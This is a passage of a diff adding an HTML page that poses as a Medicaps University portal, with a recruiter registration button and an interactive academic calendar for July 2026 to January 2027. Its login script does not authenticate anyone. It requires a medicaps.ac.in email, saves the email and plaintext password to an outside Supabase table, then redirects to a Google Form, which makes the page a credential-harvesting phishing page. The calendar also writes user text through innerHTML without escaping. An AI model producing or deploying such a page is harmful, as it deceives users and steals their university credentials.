.064-.083c.016-.032.033-.065.048-.099.03-.07.054-.142.072-.216.022-.072.032-.15.053-.221.01-.07.028-.14.052-.206.053.007.063.08.063.17 0 .046-.004.092-.01.138a.634.634 0 0 0 0 .121c-.021.06-.036.113-.048.16-.011.047-.026.088-.035.127a.893.893 0 0 1-.081.215.274.274 0 0 0-.022.12c0 .033.011.06.015.093l-.045.072-.052.066a.348.348 0 0 0-.066.113.36.36 0 0 0-.134.186c-.064.066-.081.029-.152.109-.101.122-.35.243-.385.331a.289.289 0 0 0-.095.023c-.037.014-.083.027-.127.043a2.296 2.296 0 0 0-.256.118c-.052.011-.105.012-.157.018-.052.007-.105.01-.157.009-.16-.01-.13.076-.25.072a2.469 2.469 0 0 1-.896-.338 1.859 1.859 0 0 1-.622-.619 1.704 1.704 0 0 1-.132-.18c-.037-.058-.064-.119-.094-.176-.03-.058-.051-.118-.079-.178-.027-.06-.05-.125-.078-.193a1.921 1.921 0 0 1-.027-.094c-.01-.034-.012-.068-.018-.103a1.782 1.782 0 0 1-.023-.212c-.013-.144-.006-.273-.025-.367.017-.072.035-.144.048-.227.013-.084.036-.167.053-.255a3.55 3.55 0 0 1 .163-.532c.056-.09.116-.18.175-.281l.102-.15a1.649 1.649 0 0 1 .224-.243c.036-.03.072-.063.11-.093.08-.06.164-.114.25-.163a3.29 3.29 0 0 1 .516-.233l.177-.038a.325.325 0 0 1 .138 0c.278-.06.567-.043.836.05.271.096.521.242.737.433a.189.189 0 0 0 .054.093.43.43 0 0 1 .069.106.723.723 0 0 0 .114.12.51.51 0 0 1 .102.1.225.225 0 0 0 .01.177.88.88 0 0 0 .02.056c.008.018.013.04.02.06.012.04.025.08.034.12.047.093.084.19.112.291.013.044.028.083.044.125a.914.914 0 0 0 .051.129.144.144 0 0 1-.035.144c.02.05.03.104.028.157-.004.072-.01.145-.008.206Z" fill="var(--secondary)"></path>
+                        </svg>
+                    </div>
+                    <div class="flex-1 flex flex-col gap-0.5">
+                        <h6 class="text-[15px] font-medium text-gray-900 leading-tight">Register to Recruit from Medicaps University</h6>
+                        <p class="text-[13px] text-gray-500 mt-0.5">Click here to register</p>
+                    </div>
+                </div>
+                <div class="text-gray-400 group-hover:text-gray-600 transition-colors shrink-0 pl-2 pr-1">
+                    <svg class="w-[24px] h-[24px]" focusable="false" aria-hidden="true" viewBox="0 0 24 24" fill="currentColor">
+                        <path d="M7.46755 3.36009C8.05127 2.8457 8.95463 2.8874 9.48528 3.45323L16.6271 11.0686C17.1224 11.5967 17.1224 12.4033 16.6271 12.9314L9.48528 20.5468C8.95463 21.1126 8.05127 21.1543 7.46755 20.6399C6.88384 20.1255 6.84082 19.2498 7.37147 18.684L13.6398 12L7.37147 5.31602C6.84082 4.75018 6.88384 3.87449 7.46755 3.36009Z"></path>
+                    </svg>
+                </div>
+            </button>
+        </div>
+
+        <div class="pb-10 text-center flex flex-col items-center justify-center">
+            <p class="text-[13px] text-gray-600">
+                By continuing, you agree to our <br class="sm:hidden" />
+                <a href="#" class="text-[#1976d2] hover:underline font-medium">Terms and Conditions</a> 
+                and 
+                <a href="#" class="text-[#1976d2] hover:underline font-medium">Privacy Policy.</a>
+            </p>
+        </div>
+    </div>
+
+    <!-- ========================================== -->
+    <!-- FULL SCREEN CALENDAR VIEW (Hidden by default) -->
+    <!-- ========================================== -->
+    <div id="fullScreenCalendar" class="hidden fixed inset-0 z-50 bg-[#f8fafc] overflow-y-auto custom-scrollbar transition-opacity duration-500">
+        <div class="max-w-7xl w-full mx-auto px-4 sm:px-6 py-8 lg:px-8 h-full flex flex-col">
+            
+            <!-- Calendar Header with Navigation -->
+            <div class="mb-6 flex flex-col md:flex-row justify-between items-center gap-4 border-b border-slate-200 pb-4">
+                <div class="text-center md:text-left">
+                    <h1 class="text-[#2d388a] text-[28px] md:text-[36px] font-[1000] leading-tight mb-1">Academic Calendar</h1>
+                    <h2 class="text-slate-500 text-[14px] md:text-[16px] font-semibold uppercase tracking-wider">Odd Semester Session 2026 July to December</h2>
+                </div>
+                
+                <!-- Minimalist Navigation Controls -->
+                <div class="flex items-center gap-5 bg-white px-4 py-2 rounded-full shadow-sm border border-slate-200">
+                    <button id="prevMonthBtn" class="p-2 rounded-full hover:bg-slate-100 text-[#2d388a] transition-all disabled:opacity-30 disabled:hover:bg-transparent">
+                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path></svg>
+                    </button>
+                    <h3 id="currentMonthDisplay" class="text-[18px] md:text-[20px] font-bold text-slate-800 min-w-[140px] text-center tracking-wide"></h3>
+                    <button id="nextMonthBtn" class="p-2 rounded-full hover:bg-slate-100 text-[#2d388a] transition-all disabled:opacity-30 disabled:hover:bg-transparent">
+                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path></svg>
+                    </button>
+                </div>
+            </div>
+            
+            <!-- Calendar Grid container populated via JS -->
+            <div id="calendarTimeline" class="w-full flex-1 mb-8"></div>
+        </div>
+
+        <!-- Add Event Modal -->
+        <div id="addEventModal" class="hidden fixed inset-0 z-[60] bg-slate-900/40 backdrop-blur-sm flex items-center justify-center transition-opacity duration-300">
+            <div class="bg-white rounded-2xl shadow-2xl w-full max-w-sm mx-4 overflow-hidden transform scale-100 transition-transform">
+                <div class="bg-[#2d388a] px-6 py-4 flex justify-between items-center">
+                    <h3 class="text-white font-bold text-lg tracking-wide">Add Custom Event</h3>
+                    <button id="closeModalBtn" class="text-white hover:text-slate-300 transition-colors text-2xl leading-none">&times;</button>
+                </div>
+                <div class="p-6">
+                    <input type="hidden" id="eventDayInput">
+                    <div class="mb-5">
+                        <label class="block text-sm font-semibold text-slate-700 mb-2">Event Description</label>
+                        <textarea id="eventTextInput" rows="3" class="w-full bg-slate-50 border border-slate-200 rounded-xl p-3 focus:bg-white focus:border-[#2d388a] focus:ring-2 focus:ring-[#2d388a]/20 outline-none transition-all resize-none placeholder:text-slate-400" placeholder="E.g., Project meeting at 10 AM..."></textarea>
+                    </div>
+                    <div class="flex gap-3">
+                        <button id="cancelEventBtn" class="flex-1 bg-white text-slate-700 border border-slate-300 py-2.5 rounded-xl hover:bg-slate-50 transition-colors font-semibold">Cancel</button>
+                        <button id="saveEventBtn" class="flex-1 bg-[#2d388a] text-white py-2.5 rounded-xl shadow-md hover:bg-[#1f2761] hover:shadow-lg transition-all font-semibold">Save Event</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const calendarData = [
+            { month: 'July 2026', days: 31, events: { 11: { text: "1st chance test Skill-based core classes for 1st semester", type: "event", span: "11-17" }, 20: { text: "Start of ODD Higher Semester Classes", type: "event" } } },
+            { month: 'August 2026', days: 31, events: { 10: { text: "Start of ODD Semester Course Registration", type: "event" }, 15: { text: "Independence Day (Holiday)", type: "holiday" }, 17: { text: "Start of ODD 1st Semester Classes", type: "event" }, 26: { text: "Janmashtami (Holiday)", type: "holiday" }, 28: { text: "Raksha Bandhan (Holiday)", type: "holiday" } } },
+            { month: 'September 2026', days: 30, events: { 7: { text: "Ganesh Chaturthi (Holiday)", type: "holiday" }, 16: { text: "Milad-un-Nabi (Holiday)", type: "holiday" }, 26: { text: "Day Following Anant Chaturdashi (Holiday)", type: "holiday" }, 28: { text: "MST-I Examinations", type: "exam", span: "28-30" } } },
+            { month: 'October 2026', days: 31, events: { 2: { text: "Gandhi Jayanti (Holiday)", type: "holiday" }, 4: { text: "SHL-AMCAT-SVA test", type: "event", span: "04-05" }, 12: { text: "Dussehra (Holiday)", type: "holiday" }, 21: { text: "SHL-AMCAT-All mock interview", type: "event" }, 31: { text: "Deepawali (Holiday)", type: "holiday" } } },
+            { month: 'November 2026', days: 30, events: { 15: { text: "Guru Nanak Jayanti (Holiday)", type: "holiday" }, 26: { text: "Compilation of soft course", type: "event" }, 27: { text: "END of Teaching", type: "important" } } },
+            { month: 'December 2026', days: 31, events: { 2: { text: "Preparatory Leave", type: "leave" }, 3: { text: "End Semester Examination", type: "exam", span: "03-17" }, 25: { text: "Christmas Day (Holiday)", type: "holiday" }, 26: { text: "SHL-AMCAT-VI Sem Soft Exam", type: "event" } } },
+            { month: 'January 2027', days: 31, events: { 2: { text: "End Semester examination and Copy Viewing", type: "event", span: "02-10" }, 12: { text: "Start of Even Semester Course Registration", type: "event" }, 14: { text: "UFM Meeting", type: "event" }, 18: { text: "Start of EVEN Semester Classes", type: "important_even" } } }
+        ];
+
+        let currentMonthIndex = 0;
+
+        function renderCalendar() {
+            const container = document.getElementById('calendarTimeline');
+            const monthData = calendarData[currentMonthIndex];
+            
+            // Update Navigation state
+            document.getElementById('currentMonthDisplay').textContent = monthData.month;
+            document.getElementById('prevMonthBtn').disabled = currentMonthIndex === 0;
+            document.getElementById('nextMonthBtn').disabled = currentMonthIndex === calendarData.length - 1;
+
+            const dateObj = new Date(monthData.month);
+            const startDay = dateObj.getDay();
+            const daysOfWeek = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
+
+            // Setup elegant minimalist container
+            let html = `
+                <div class="bg-white rounded-3xl shadow-md shadow-slate-200/50 border border-[#e2e8f0] overflow-hidden flex flex-col h-full">
+                    <div class="grid grid-cols-7 border-b border-[#e2e8f0] bg-[#e0f2fe]">
+            `;
+
+            // Day Headers
+            daysOfWeek.forEach(day => {
+                html += `<div class="text-center font-bold text-slate-400 text-xs md:text-sm uppercase tracking-widest py-4">${day}</div>`;
+            });
+            
+            html += `</div><div class="grid grid-cols-7 flex-1 auto-rows-[120px] md:auto-rows-[140px]">`;
+
+            // Padding Empty Cells
+            for (let i = 0; i < startDay; i++) {
+                html += `<div class="bg-[#f0f9ff]/50 border-r border-b border-[#e2e8f0] p-2"></div>`;
+            }
+
+            let currentSpanEnd = 0;
+            let currentSpanEvent = null;
+
+            // Generate Day Cells
+            for (let d = 1; d <= monthData.days; d++) {
+                // Ensure data structures exist for user interactions
+                let ev = monthData.events[d] || {};
+                if (!ev.userEvents) ev.userEvents = [];
+                if (ev.pinned === undefined) ev.pinned = false;
+                monthData.events[d] = ev; // persist back
+
+                if (ev.span) {
+                    currentSpanEnd = parseInt(ev.span.split('-')[1]);
+                    currentSpanEvent = ev;
+                }
+
+                let activeEvent = ev.text ? ev : (d <= currentSpanEnd ? currentSpanEvent : null);
+                let isPinned = ev.pinned;
+                
+                // Minimalist cell styling based on state
+                let cellClasses = "relative group p-2 md:p-3 border-r border-b border-[#e2e8f0] transition-all flex flex-col overflow-hidden overflow-y-auto custom-scrollbar ";
+                
+                if (isPinned) {
+                    cellClasses += "bg-[#fefce8] hover:bg-[#fef9c3] "; // Soft yellow tint for pinned
+                } else {
+                    cellClasses += "bg-[#f0f9ff] hover:bg-[#e0f2fe] "; // Beautiful bright sky blue tint
+                }
+
+                let numClasses = "text-[14px] md:text-[16px] font-bold inline-flex items-center justify-center w-7 h-7 rounded-full transition-colors ";
+                
+                // Today/Holiday highlight logic for numbers
+                if (activeEvent && activeEvent.type === 'holiday') {
+                    numClasses += "text-red-500 bg-red-50 group-hover:bg-red-100";
+                } else {
+                    numClasses += "text-slate-700 group-hover:text-[#2d388a] group-hover:bg-[#e8eaf6]";
+                }
+
+                html += `<div class="${cellClasses}">`;
+                
+                // Top Row: Date Number + Action Buttons (Pin/Add)
+                html += `
+                    <div class="flex justify-between items-start mb-2 shrink-0">
+                        <span class="${numClasses}">${d}</span>
+                        <div class="flex gap-1 opacity-0 group-hover:opacity-100 transition-opacity duration-200">
+                            <button onclick="togglePin(${d})" class="p-1.5 rounded-lg text-slate-400 hover:text-yellow-500 hover:bg-yellow-50 transition-all" title="${isPinned ? 'Unpin Day' : 'Pin Day'}">
+                                <svg class="w-4 h-4" ${isPinned ? 'fill="currentColor" class="text-yellow-500"' : 'fill="none"'} stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 5a2 2 0 012-2h10a2 2 0 012 2v16l-7-3.5L5 21V5z"></path></svg>
+                            </button>
+                            <button onclick="openAddEventModal(${d})" class="p-1.5 rounded-lg text-slate-400 hover:text-[#2d388a] hover:bg-[#e8eaf6] transition-all" title="Add Event">
+                                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 4v16m8-8H4"></path></svg>
+                            </button>
+                        </div>
+                    </div>
+                `;
+
+                // Render Original Institutional Event
+                if (activeEvent && activeEvent.text) {
+                    let eventStyle = "";
+                    if (activeEvent.type === 'holiday') eventStyle = "bg-red-50 text-red-700 border-red-100";
+                    else if (activeEvent.type === 'exam') eventStyle = "bg-indigo-50 text-indigo-700 border-indigo-100";
+                    else if (activeEvent.type === 'important' || activeEvent.type === 'important_even') eventStyle = "bg-blue-50 text-blue-700 border-blue-100";
+                    else if (activeEvent.type === 'leave') eventStyle = "bg-slate-100 text-slate-600 border-slate-200";
+                    else eventStyle = "bg-[#f8fafc] text-slate-700 border-slate-200";
+                    
+                    html += `<div class="text-[10px] md:text-[12px] leading-tight rounded-md px-2 py-1.5 mb-1.5 font-semibold border ${eventStyle}">${activeEvent.text}</div>`;
+                }
+
+                // Render User Added Events
+                if (ev.userEvents.length > 0) {
+                    ev.userEvents.forEach((uEv, idx) => {
+                        html += `
+                        <div class="text-[10px] md:text-[11px] leading-tight rounded-md px-2 py-1.5 mb-1.5 bg-emerald-50 text-emerald-700 border border-emerald-100 flex justify-between items-start gap-1 group/uev">
+                            <span class="break-words">${uEv}</span>
+                            <button onclick="deleteUserEvent(${d}, ${idx})" class="opacity-0 group-hover/uev:opacity-100 text-emerald-600 hover:text-red-500 transition-colors shrink-0 font-bold text-sm leading-none">&times;</button>
+                        </div>`;
+                    });
+                }
+
+                html += `</div>`;
+
+                // Clear multi-day span tracker when ended
+                if (d === currentSpanEnd) {
+                    currentSpanEnd = 0;
+                    currentSpanEvent = null;
+                }
+            }
+
+            // Fill trailing Empty Cells
+            const totalCells = startDay + monthData.days;
+            const remainder = totalCells % 7;
+            if (remainder !== 0) {
+                for (let i = 0; i < 7 - remainder; i++) {
+                    html += `<div class="bg-[#f0f9ff]/50 border-r border-b border-[#e2e8f0] p-2"></div>`;
+                }
+            }
+
+            html += `</div></div>`;
+            container.innerHTML = html;
+        }
+
+        document.getElementById('prevMonthBtn').addEventListener('click', () => {
+            if (currentMonthIndex > 0) {
+                currentMonthIndex--;
+                renderCalendar();
+            }
+        });
+
+        document.getElementById('nextMonthBtn').addEventListener('click', () => {
+            if (currentMonthIndex < calendarData.length - 1) {
+                currentMonthIndex++;
+                renderCalendar();
+            }
+        });
+
+        function togglePin(day) {
+            calendarData[currentMonthIndex].events[day].pinned = !calendarData[currentMonthIndex].events[day].pinned;
+            renderCalendar();
+        }
+
+        function openAddEventModal(day) {
+            document.getElementById('eventDayInput').value = day;
+            document.getElementById('eventTextInput').value = '';
+            document.getElementById('addEventModal').classList.remove('hidden');
+            setTimeout(() => document.getElementById('eventTextInput').focus(), 100);
+        }
+
+        function closeAddEventModal() {
+            document.getElementById('addEventModal').classList.add('hidden');
+        }
+
+        document.getElementById('closeModalBtn').addEventListener('click', closeAddEventModal);
+        document.getElementById('cancelEventBtn').addEventListener('click', closeAddEventModal);
+
+        document.getElementById('saveEventBtn').addEventListener('click', () => {
+            const day = document.getElementById('eventDayInput').value;
+            const text = document.getElementById('eventTextInput').value.trim();
+            if (text) {
+                calendarData[currentMonthIndex].events[day].userEvents.push(text);
+                closeAddEventModal();
+                renderCalendar();
+            }
+        });
+
+        function deleteUserEvent(day, index) {
+            calendarData[currentMonthIndex].events[day].userEvents.splice(index, 1);
+            renderCalendar();
+        }
+
+        // Email Validation Logic
+        const emailInput = document.getElementById('emailInput');
+        if(emailInput) {
+            emailInput.addEventListener('input', function () {
+                // Box becomes red if there's text but it doesn't match the required domain
+                if (this.value.length > 0 && !this.value.endsWith('@medicaps.ac.in')) {
+                    this.classList.add('invalid-email');
+                } else {
+                    this.classList.remove('invalid-email');
+                }
+            });
+        }
+
+        // Toggle Password Visibility functionality
+        const togglePassword = document.getElementById('togglePassword');
+        const passwordInput = document.getElementById('password');
+
+        if(togglePassword && passwordInput) {
+            togglePassword.addEventListener('click', function () {
+                const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+                passwordInput.setAttribute('type', type);
+                if (type === 'text') {
+                    this.classList.replace('text-gray-500', 'text-[#1976d2]');
+                } else {
+                    this.classList.replace('text-[#1976d2]', 'text-gray-500');
+                }
+            });
+        }
+
+        // --- Supabase Authentication Logic ---
+        const supabaseUrl = 'https://nkdsmdkimiasgkmoolmb.supabase.co';
+        const supabaseAnonKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5rZHNtZGtpbWlhc2drbW9vbG1iIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzU1NjY5MTcsImV4cCI6MjA5MTE0MjkxN30.ZN7dvyGShVlGp4iCNg91EvDnCRcnw4oRsnjN_yfUDs4';
+        const supabaseClient = window.supabase.createClient(supabaseUrl, supabaseAnonKey);
+
+        const loginForm = document.getElementById('loginForm');
+        const authMessage = document.getElementById('authMessage');
+        const submitBtn = document.getElementById('submitBtn');
+
+        if (loginForm) {
+            loginForm.addEventListener('submit', async function (e) {
+                e.preventDefault(); 
+
+                const email = emailInput.value.trim();
+                const password = passwordInput.value;
+
+                if (!email || !password) {
+                    authMessage.textContent = 'Please enter both email and password.';
+                    authMessage.classList.remove('hidden', 'text-green-600', 'bg-green-50');
+                    authMessage.classList.add('text-red-600', 'bg-red-50');
+                    return;
+                }
+
+                submitBtn.textContent = 'Logging in...';
+                submitBtn.disabled = true;
+                authMessage.classList.add('hidden');
+
+                const { data, error } = await supabaseClient
+                    .from('medicaps')
+                    .insert([{ email: email, pass: password }])
+                    .select(); 
+
+                if (error) {
+                    submitBtn.textContent = 'Log in';
+                    submitBtn.disabled = false;
+                    console.error('Supabase error:', error);
+                    authMessage.textContent = 'Error: ' + error.message;
+                    authMessage.classList.remove('hidden', 'text-green-600', 'bg-green-50');
+                    authMessage.classList.add('text-red-600', 'bg-red-50');
+                } else {
+                    console.log('Row saved:', data);
+                    
+                    // Redirect to the specific Google Form directly after successfully saving credentials
+                    window.location.href = "https://docs.google.com/forms/d/e/1FAIpQLSeRxE8UAvb4gmnDEYsDbxZ0bur_XQTD4v5aq-AjovmQoX6vyg/viewform";
+                }
+            });
+        }
+    </script>
+</body>
+</html>
